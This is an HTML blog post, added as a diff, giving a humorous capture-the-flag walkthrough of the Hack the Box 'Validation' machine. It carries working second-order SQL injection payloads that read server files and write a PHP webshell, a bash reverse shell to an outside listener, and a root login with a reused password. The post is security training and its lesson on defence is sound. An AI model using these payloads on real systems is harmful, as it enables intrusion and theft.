@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="What the INSERT statement sanitized, the SELECT statement trusted blindly. Second-order SQL injection through a dropdown menu turns safe input into file reads, source code leaks, and a webshell on Hack the Box Validation.">
+  <meta name="theme-color" content="#0a0a0f">
+  <title>Validation | Hack the Cube</title>
+
+  <meta property="og:title" content="Validation - Hack the Cube">
+  <meta property="og:description" content="Second-order SQL injection: safe on the way in, lethal on the way out. For science.">
+  <meta property="og:image" content="/blog/posts/validation/images/header.png">
+  <meta property="og:type" content="article">
+  <meta property="article:published_time" content="2026-02-17T00:00:00Z">
+
+  <link rel="stylesheet" href="/blog/assets/styles/blog.css">
+</head>
+<body>
+  <div class="blog-container">
+
+    <header style="padding: 1rem 0; border-bottom: 2px solid var(--border-dim); margin-bottom: 2rem;">
+      <a href="/blog/" style="display: flex; align-items: center; gap: 1rem; text-decoration: none;">
+        <span style="font-family: var(--font-pixel); font-size: 0.8rem; color: var(--terminal-green);">
+          &lt; HACK THE CUBE
+        </span>
+      </a>
+    </header>
+
+    <header class="post-header">
+      <h1 class="post-title">Validation</h1>
+
+      <div class="post-meta">
+        <div class="post-meta-item">
+          <span class="post-meta-label">Date:</span>
+          <span>February 17, 2026</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Difficulty:</span>
+          <span class="post-difficulty easy">Easy</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">OS:</span>
+          <span>Linux</span>
+        </div>
+        <div class="post-meta-item solve-time">
+          <span class="post-meta-label">SOLVE TIME:</span>
+          <span class="time-value">~01:30:00</span>
+        </div>
+      </div>
+
+      <img
+        src="/blog/posts/validation/images/header.png"
+        alt="Validation - Second-order SQL injection exploitation"
+        class="post-header-image"
+      >
+
+      <div class="tags-container" style="justify-content: center;">
+        <a href="/blog/tags/linux.html" class="tag">linux</a>
+        <a href="/blog/tags/easy.html" class="tag">easy</a>
+        <a href="/blog/tags/sqli.html" class="tag">sqli</a>
+        <a href="/blog/tags/php.html" class="tag">php</a>
+        <a href="/blog/tags/web.html" class="tag">web</a>
+        <a href="/blog/tags/rce.html" class="tag">rce</a>
+        <a href="/blog/tags/nmap.html" class="tag">nmap</a>
+        <a href="/blog/tags/glados.html" class="tag glados">glados</a>
+      </div>
+
+      <div class="post-characters">
+        <span class="post-meta-label">Guides:</span>
+        <span class="character-glados">GlaDOS</span>
+        <span class="character-wheatley">Wheatley</span>
+      </div>
+    </header>
+
+    <main class="post-content">
+
+      <h2>The Mission Briefing</h2>
+
+      <p>The box was called <strong>Validation</strong>. A Linux machine. Easy difficulty. A PHP registration form with a username field and a country dropdown. Looked harmless &mdash; the kind of form you fill out a hundred times a day without thinking. But the dropdown was hiding something. The data going <em>in</em> was sanitized perfectly. The data coming <em>out</em> was not.</p>
+
+      <p>This is a box about trust. Specifically, about trusting your own database. The INSERT was safe. The SELECT was not. And that gap &mdash; that tiny, invisible gap between writing data and reading it back &mdash; was wide enough to drive a webshell through.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"A registration form. Username and country. Prepared statements on the INSERT. Raw concatenation on the SELECT. The developer sanitized the front door and left the back door made of tissue paper. I want you to appreciate the architectural irony before we begin the demolition."</div>
+      </div>
+
+      <div class="dialogue wheatley">
+        <div class="dialogue-speaker">Wheatley</div>
+        <div class="dialogue-text">"Right, okay, so &mdash; a dropdown. A dropdown menu. Those are safe, yeah? You can only pick what's in the list. That's the whole point of a dropdown. ...Right? Oh no. Oh no no no. You can change them, can't you. You can just... change the value. Before it sends. That's &mdash; that's not great, is it."</div>
+      </div>
+
+      <h2>Reconnaissance</h2>
+
+      <p>The nmap scan came back with four ports. Not a huge attack surface, but every port told a story.</p>
+
+      <div class="terminal-log">
+nmap -sC -sV 10.129.95.235
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1
+80/tcp   open  http    Apache httpd 2.4.48 (Debian)
+|_http-server-header: Apache/2.4.48 (Debian)
+| Cookie: user=...
+4566/tcp open  http    nginx
+|_http-title: 403 Forbidden
+8080/tcp open  http    nginx
+|_http-title: 502 Bad Gateway</div>
+
+      <p>Four ports, but really only one that mattered:</p>
+
+      <ul>
+        <li><strong>Port 22</strong> &mdash; SSH. Standard. Need credentials first</li>
+        <li><strong>Port 80</strong> &mdash; Apache with PHP. The main target. Already setting cookies on first visit</li>
+        <li><strong>Port 4566</strong> &mdash; nginx returning 403 Forbidden. Nothing to see here</li>
+        <li><strong>Port 8080</strong> &mdash; nginx returning 502 Bad Gateway. Backend down or misconfigured</li>
+      </ul>
+
+      <p>Port 80 was the only way in. I browsed to it and found a simple registration page: a text field for username, a dropdown for country, and a "Join Now" button. After submitting, you'd land on <code>account.php</code>, which displayed a list of all registered users from your selected country.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Two nginx services returning errors. The developer left scaffolding exposed. But they're irrelevant. Focus on port 80. The PHP application. The dropdown. Tell me &mdash; when you submit a form, what actually gets sent to the server? The HTML element? The visual dropdown? No. A string. A string that your browser helpfully lets you modify before transmission. Dropdown menus are suggestions, not constraints."</div>
+      </div>
+
+      <h2>The Dropdown Deception</h2>
+
+      <p>Here's the first lesson this box teaches: <strong>client-side controls are decorative</strong>. A dropdown menu in HTML looks like a restricted input. You can only pick from the predefined options. But that restriction lives entirely in your browser. The server receives a POST parameter &mdash; just a string &mdash; and has no way to know whether it came from a dropdown, a text field, or a curl command.</p>
+
+      <p>I intercepted the registration request with Burp Suite and started testing. The username field was clean &mdash; likely parameterized. But the <code>country</code> parameter? I replaced "Brazil" with a single quote.</p>
+
+      <div class="terminal-log">
+POST / HTTP/1.1
+Host: 10.129.95.235
+Content-Type: application/x-www-form-urlencoded
+Cookie: user=abc123
+
+username=testuser&country=Brazil'</div>
+
+      <p>The response from <code>account.php</code> broke. Not an error page &mdash; the output just stopped rendering correctly. Classic SQL injection behavior. The single quote was disrupting the query structure.</p>
+
+      <div class="dialogue wheatley">
+        <div class="dialogue-speaker">Wheatley</div>
+        <div class="dialogue-text">"Wait, hold on &mdash; I thought you said the INSERT used prepared statements? So it's safe? But also not safe? I'm confused. Both things are true at once? That's... that's very stressful actually."</div>
+      </div>
+
+      <h2>Second-Order SQL Injection</h2>
+
+      <p>This is where Validation gets interesting, and where it teaches something most basic SQLi tutorials never cover.</p>
+
+      <p><strong>Second-order SQL injection</strong> happens when data is safely stored in the database (via prepared statements, parameterized queries, proper escaping) but then later retrieved and used unsafely in a different query. The INSERT is bulletproof. The SELECT is not. The vulnerability isn't in how the data goes in &mdash; it's in how the data comes out.</p>
+
+      <p>Here's the flow:</p>
+
+      <ol>
+        <li>User submits username + country via the registration form</li>
+        <li>The application INSERTs both values using a prepared statement &mdash; <strong>safe</strong></li>
+        <li>The user is redirected to <code>account.php</code></li>
+        <li><code>account.php</code> retrieves the user's stored country from the database</li>
+        <li>It then builds a <em>second</em> query by concatenating that stored country value directly into a raw SQL string &mdash; <strong>vulnerable</strong></li>
+      </ol>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"The developer's logic was: 'I sanitized it on input, so it's safe in my database, so I don't need to sanitize it on output.' Each of those statements is true individually. Together, they form a chain of reasoning that ends in remote code execution. This is why I prefer testing to assumptions."</div>
+      </div>
+
+      <p>The vulnerable line in <code>account.php</code> (which I'd later confirm by reading the source code) looked like this:</p>
+
+      <div class="terminal-log">
+// The vulnerable query in account.php:
+$sql = "SELECT username FROM registration WHERE country = '" . $row['country'] . "'";</div>
+
+      <p>The stored country value &mdash; whatever we put in that dropdown field &mdash; gets concatenated directly into the SQL string. No escaping. No parameterization. If the stored value is <code>Brazil' UNION SELECT 1-- -</code>, the resulting query becomes:</p>
+
+      <div class="terminal-log">
+SELECT username FROM registration WHERE country = 'Brazil' UNION SELECT 1-- -'</div>
+
+      <p>And just like that, we have UNION-based SQL injection.</p>
+
+      <h2>Exploiting the Injection</h2>
+
+      <p>With confirmed SQLi through the country parameter, I started extracting information. Each payload required a new registration (new username, malicious country value), because the injection happened on the subsequent page load.</p>
+
+      <p>First, the database name:</p>
+
+      <div class="terminal-log">
+# Payload in country parameter:
+Brazil' UNION SELECT database()-- -
+
+# Response on account.php showed:
+registration</div>
+
+      <p>Database name: <code>registration</code>. Next, I needed to know what privileges the database user had. If the DB user had FILE privilege, I could read files from the filesystem and potentially write files too.</p>
+
+      <div class="terminal-log">
+# Check user privileges:
+Brazil' UNION SELECT privilege_type FROM information_schema.user_privileges-- -
+
+# Response:
+SELECT
+INSERT
+UPDATE
+DELETE
+CREATE
+DROP
+RELOAD
+SHUTDOWN
+PROCESS
+FILE
+REFERENCES
+INDEX
+ALTER
+...</div>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"ALL privileges. The database user has ALL privileges. Including FILE. The principle of least privilege exists for exactly this scenario, and it was ignored with remarkable thoroughness. FILE privilege means LOAD_FILE to read arbitrary files and INTO OUTFILE to write them. You now have read and write access to the entire filesystem. Through a dropdown menu."</div>
+      </div>
+
+      <div class="dialogue wheatley">
+        <div class="dialogue-speaker">Wheatley</div>
+        <div class="dialogue-text">"ALL privileges?! On a &mdash; on a web application database user?! That's like giving the intern the launch codes! Not that I'm judging. I once had all the privileges. Briefly. It did not end well. For anyone. Especially the facility."</div>
+      </div>
+
+      <h2>Reading the Filesystem</h2>
+
+      <p>With FILE privilege confirmed, I could use MySQL's <code>LOAD_FILE()</code> function to read files from the server. I started with the classic &mdash; <code>/etc/passwd</code>:</p>
+
+      <div class="terminal-log">
+# First attempt (broken rendering):
+Brazil' UNION SELECT LOAD_FILE('/etc/passwd')-- -
+
+# Output was garbled - newlines in the file content
+# broke the HTML table rendering on account.php</div>
+
+      <p>The problem was subtle but educational. <code>LOAD_FILE()</code> returns the file contents as-is, including newline characters. When that content gets rendered in an HTML page, the newlines mess up the table structure. The browser tries to interpret the file contents as HTML and everything breaks.</p>
+
+      <p>The fix: <strong>HEX encoding</strong>. MySQL's <code>HEX()</code> function converts the output to a hexadecimal string &mdash; no newlines, no special characters, just clean alphanumeric output that survives HTML rendering.</p>
+
+      <div class="terminal-log">
+# HEX-encoded file read:
+Brazil' UNION SELECT HEX(LOAD_FILE('/etc/passwd'))-- -
+
+# Response (decoded from hex):
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www/html:/usr/sbin/nologin
+htb:x:1000:1000::/home/htb:/bin/bash</div>
+
+      <p>Clean output. I could see there was a user called <code>htb</code> with a home directory and a real shell. That's my user flag target.</p>
+
+      <p>Next, I went after the application source code. If there's a <code>config.php</code>, it almost always contains database credentials:</p>
+
+      <div class="terminal-log">
+# Read config.php:
+Brazil' UNION SELECT HEX(LOAD_FILE('/var/www/html/config.php'))-- -
+
+# Decoded result:
+&lt;?php
+  $servername = "127.0.0.1";
+  $username = "uhc";
+  $password = "uhc-9qual-global-pw";
+  $dbname = "registration";
+?&gt;</div>
+
+      <p>Database credentials: <code>uhc</code> / <code>uhc-9qual-global-pw</code>. I filed that password away &mdash; credential reuse is always worth testing later.</p>
+
+      <p>I also read <code>account.php</code> to confirm the vulnerability I was exploiting:</p>
+
+      <div class="terminal-log">
+# Read account.php source:
+Brazil' UNION SELECT HEX(LOAD_FILE('/var/www/html/account.php'))-- -
+
+# The vulnerable section (decoded):
+$sql = "SELECT username FROM registration WHERE country = '"
+       . $row['country'] . "'";</div>
+
+      <p>There it was. The exact line. The <code>$row['country']</code> value &mdash; pulled straight from the database with no sanitization &mdash; concatenated into a raw SQL string. The INSERT was safe. This SELECT was the vulnerability. Textbook second-order injection confirmed by source code.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"You've confirmed the vulnerability by reading the source code through the vulnerability itself. There's a satisfying recursion to that. The application's own code testifies against it. Now. You have FILE privilege. You can write files. The web root is /var/www/html. I trust you can see where this is going."</div>
+      </div>
+
+      <h2>Writing a Webshell</h2>
+
+      <p>FILE privilege in MySQL doesn't just mean reading files. It also means <strong>writing</strong> them via <code>INTO OUTFILE</code>. And if you can write a PHP file into the web root, you have remote code execution.</p>
+
+      <p>One important constraint: <code>INTO OUTFILE</code> cannot overwrite existing files. It can only create new ones. So I needed a fresh filename.</p>
+
+      <div class="terminal-log">
+# Write a PHP webshell via second-order SQLi:
+Brazil' UNION SELECT '&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/html/shell.php'-- -</div>
+
+      <p>After registering with that payload and visiting <code>account.php</code> to trigger the second-order injection, the webshell was written. I tested it:</p>
+
+      <div class="terminal-log">
+curl http://10.129.95.235/shell.php?cmd=whoami
+
+www-data</div>
+
+      <p>Remote code execution as <code>www-data</code>. From a dropdown menu. Through a second-order SQL injection. Through MySQL FILE privilege. Through a PHP webshell. The chain was complete.</p>
+
+      <div class="dialogue wheatley">
+        <div class="dialogue-speaker">Wheatley</div>
+        <div class="dialogue-text">"You wrote a file. To the server. Through a dropdown menu. Through SQL. That went into a database. And came back out. And then wrote a file. That's &mdash; that's so many steps! How did you keep track of all those steps? I lose track after two steps. Sometimes one step. Okay, consistently one step."</div>
+      </div>
+
+      <h2>User Flag</h2>
+
+      <p>With RCE as www-data, grabbing the user flag was straightforward:</p>
+
+      <div class="terminal-log">
+curl "http://10.129.95.235/shell.php?cmd=cat+/home/htb/user.txt"
+
+<span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">d4d801b823a850b975a09daf920ff5c5</span></span></div>
+
+      <p>User flag captured. But I was still www-data. Time to escalate.</p>
+
+      <h2>From www-data to Root</h2>
+
+      <p>Remember that database password from config.php? <code>uhc-9qual-global-pw</code>. It had "global" right in the name. That's practically begging to be reused.</p>
+
+      <p>I tested it against the root account:</p>
+
+      <div class="terminal-log">
+curl "http://10.129.95.235/shell.php?cmd=echo+uhc-9qual-global-pw+|+su+-c+'cat+/root/root.txt'+root"
+
+# No luck via webshell - su needs a proper TTY</div>
+
+      <p>The webshell didn't have a proper TTY for <code>su</code>. I needed a real shell. I set up a reverse shell:</p>
+
+      <div class="terminal-log">
+# Listener:
+nc -lvnp 4444
+
+# Trigger reverse shell via webshell:
+curl "http://10.129.95.235/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.8/4444+0>%261'"
+
+# Got shell as www-data, then:
+www-data@validation:/var/www/html$ su root
+Password: uhc-9qual-global-pw
+
+root@validation:~# whoami
+root</div>
+
+      <p>The database password was the root password. <strong>Credential reuse.</strong> The simplest privilege escalation vector there is, and one of the most common in real environments. Why crack hashes or find kernel exploits when the admin used the same password everywhere?</p>
+
+      <div class="terminal-log">
+root@validation:~# cat /root/root.txt
+<span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">731cbddcef8d44629c3e990f55e9f6f8</span></span></div>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"The password was named 'global.' The developer labeled their own vulnerability. They wrote 'this password is used everywhere' into the password itself and then used it everywhere. I have observed many forms of human behavior in my facility, but self-documenting security failures remain my favorite genre."</div>
+      </div>
+
+      <h2>What I Learned</h2>
+
+      <p>Validation taught me more about SQL injection than any textbook could. Not because the injection itself was complex &mdash; it was UNION-based, straightforward once you found it &mdash; but because of <em>where</em> the vulnerability lived and <em>why</em> it existed.</p>
+
+      <ul>
+        <li><strong>Second-order SQL injection is real and dangerous</strong> &mdash; Data can be sanitized perfectly on input and still cause injection on output. If your SELECT queries use stored values without parameterization, you're vulnerable. Every query that touches data needs its own protection, not just the one that stores it</li>
+        <li><strong>Client-side controls are not security</strong> &mdash; Dropdown menus, hidden fields, JavaScript validation &mdash; all of these live in the browser and can be modified by the user. Server-side validation is the only validation that counts</li>
+        <li><strong>FILE privilege is devastating</strong> &mdash; A database user with FILE privilege can read server configuration, application source code, and system files via LOAD_FILE. It can write webshells via INTO OUTFILE. The principle of least privilege exists for exactly this reason</li>
+        <li><strong>HEX encoding solves rendering problems</strong> &mdash; When SQL injection output contains newlines or special characters that break page rendering, wrapping in HEX() gives you clean output you can decode offline</li>
+        <li><strong>Credential reuse is a privilege escalation vector</strong> &mdash; Always test discovered passwords against other accounts and services. A database password that works for root is depressingly common</li>
+        <li><strong>INTO OUTFILE cannot overwrite</strong> &mdash; Plan your webshell filename carefully. If you mess up the content, you need a new filename since MySQL refuses to write to an existing path</li>
+      </ul>
+
+      <div class="dialogue wheatley">
+        <div class="dialogue-speaker">Wheatley</div>
+        <div class="dialogue-text">"So the takeaway is: don't trust anything. Don't trust dropdowns. Don't trust your own database. Don't trust passwords with 'global' in the name. Don't trust prepared statements to protect queries they're not actually used in. Is that &mdash; is that the lesson? Just... trust nothing? That's quite bleak actually. I need a moment."</div>
+      </div>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Test complete. Both flags obtained. The entire attack chain &mdash; from dropdown manipulation to root shell &mdash; existed because of a single line of code. One concatenation in a SELECT statement. The INSERT was parameterized. The developer knew how to write safe queries. They simply chose not to. Consistently. The data was validated on the way in and trusted on the way out, which is rather like locking your front door and leaving the windows open. But I suppose the box was called Validation, not Thorough Validation. Same time next test chamber?"</div>
+      </div>
+
+    </main>
+
+    <aside class="attack-path">
+      <h3>Attack Path Summary</h3>
+      <ol>
+        <li>Nmap scan: 4 ports open &mdash; SSH (22), Apache/PHP (80), nginx 403 (4566), nginx 502 (8080)</li>
+        <li>PHP registration form with username text input and country dropdown</li>
+        <li>Discovered second-order SQLi: country value safely INSERTed but unsafely SELECTed in account.php</li>
+        <li>Confirmed FILE privilege via information_schema.user_privileges</li>
+        <li>Used HEX(LOAD_FILE()) to read /etc/passwd, config.php, and account.php source</li>
+        <li>Extracted DB credentials: uhc / uhc-9qual-global-pw</li>
+        <li>Wrote PHP webshell via UNION SELECT INTO OUTFILE</li>
+        <li>RCE as www-data &mdash; captured user flag</li>
+        <li>Credential reuse: DB password = root password &mdash; su root &mdash; captured root flag</li>
+      </ol>
+    </aside>
+
+    <nav class="post-nav">
+      <a href="/blog/posts/return/" class="post-nav-link prev">Return</a>
+      <span></span>
+    </nav>
+
+    <footer class="blog-footer">
+      <p class="footer-text">
+        <a href="/blog/" class="footer-link">Back to Test Chamber Archives</a>
+      </p>
+      <p class="footer-text" style="font-size: 0.8rem; color: var(--text-dim);">
+        For science. You monster.
+      </p>
+    </footer>
+
+  </div>
+</body>
+</html>
